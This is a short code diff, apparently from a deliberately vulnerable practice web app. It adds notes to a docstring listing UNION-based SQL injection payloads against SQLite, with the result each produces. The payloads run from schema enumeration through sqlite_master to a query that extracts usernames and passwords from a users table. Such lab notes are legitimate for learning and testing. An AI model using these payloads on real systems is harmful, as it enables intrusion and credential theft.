@@ -54,10 +54,15 @@ def Search(product):
     conn.close()
     """
     UNION SQL INJECTION
+
+    EXFILTRATE DB SCHEMA
     ' UNION SELECT * FROM x-- (Error: No such table x)
     ' UNION SELECT '1' FROM sqlite_master-- (Error: SELECTs to the left and right of UNION do not have the same number of result columns)
     ' UNION SELECT '1', '2', '3', '4', '5', '6' FROM sqlite_master-- (Returns all products)
     ' UNION SELECT '1', sql, '3', '4', '5', '6' FROM sqlite_master-- (Returns all tables in schema)
+
+    GET ALL USER CREDENTIALS (After knowing fields in user table)
+    ' UNION SELECT '1', username, '3', '4', password,'6' FROM users--
     """
 
     # Search Form
